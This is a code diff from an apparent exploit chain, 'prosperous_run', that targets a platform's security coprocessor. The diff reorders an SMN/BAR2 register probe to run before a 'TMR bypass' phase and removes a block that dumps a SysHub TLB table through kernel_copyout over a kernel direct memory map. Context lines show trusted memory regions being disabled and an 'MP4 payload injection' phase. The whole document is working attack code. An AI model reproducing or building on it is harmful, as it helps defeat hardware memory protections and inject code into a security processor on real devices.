@@ -266,6 +266,13 @@ int prosperous_run(void)
         return ret;
     }
 
+    /* Phase 0.5: SMN + BAR2 probe BEFORE TMR disable.
+     * These use PCI config/MMIO (not DRAM via DMAP), so TMR state
+     * doesn't matter. Running before TMR disable avoids the
+     * timing-dependent crash that occurs after TMR 20 removal
+     * (MP4 coprocessor instability after ~100-200ms). */
+    phase1_5_smn_bar2_probe(&ctx);
+
     /* Phase 1: TMR bypass */
     printf("\n[*] Phase 1: TMR bypass...\n");
 
@@ -275,48 +282,6 @@ int prosperous_run(void)
         return ret;
     }
     printf("[+] TMR 20 disabled, TMR 21 created\n");
-
-    /* Phase 1.5: SysHub TLB + SMN + BAR2 probe
-     * Part A inline (small stack). Parts B+C in separate function.
-     *
-     * PREVIOUS CRASH ROOT CAUSE: Wrote SMN addresses to B0:D18:F2+0x64
-     *   (wrong register — that's a DF register, NOT SMN). Correct SMN
-     *   access is B0:D0:F0+0x60 (index) / +0x64 (data), which the TMR
-     *   code already uses successfully every run.
-     *
-     * THIS ITERATION:
-     *   A. SysHub TLB table (512 bytes, proven safe)
-     *   B. SMN probe via CORRECT B0:D0:F0+0x60/0x64 path
-     *      Targeting MP4 controller regs, NOT raw DRAM addresses.
-     *      Same mechanism TMR code uses — proven safe.
-     *   C. Read BAR2+0x200000 first 16 registers (known safe offset)
-     */
-    printf("\n[*] Phase 1.5: TLB + SMN probe...\n");
-    {
-        uint64_t dmap = ctx.dmap_base;
-
-        /* Part A: SysHub TLB table - small chunks to minimize stack */
-        printf("[*] Part A: SysHub TLB table (512 bytes)...\n");
-        for (int chunk = 0; chunk < 8; chunk++) {
-            uint32_t buf[16]; /* 64 bytes per chunk */
-            for (int w = 0; w < 16; w++)
-                kernel_copyout(dmap + 0x607F0000ULL + (chunk*16+w)*4,
-                               &buf[w], 4);
-            for (int row = 0; row < 4; row++) {
-                printf("[TLB] +%03x: %08x %08x %08x %08x\n",
-                       (chunk*4+row) * 16, buf[row*4], buf[row*4+1],
-                       buf[row*4+2], buf[row*4+3]);
-            }
-        }
-
-        /* Sanity check */
-        uint32_t val = 0xDEADDEAD;
-        int32_t rc = kernel_copyout(dmap + 0x60700000ULL, &val, 4);
-        printf("[DRAM] PA 0x60700000 = 0x%08x (rc=%d)\n", val, rc);
-    }
-
-    /* Parts B+C in separate function (own stack frame) */
-    phase1_5_smn_bar2_probe(&ctx);
 
     /* Phase 2: MP4 payload injection */
     printf("\n[*] Phase 2: MP4 payload injection...\n");
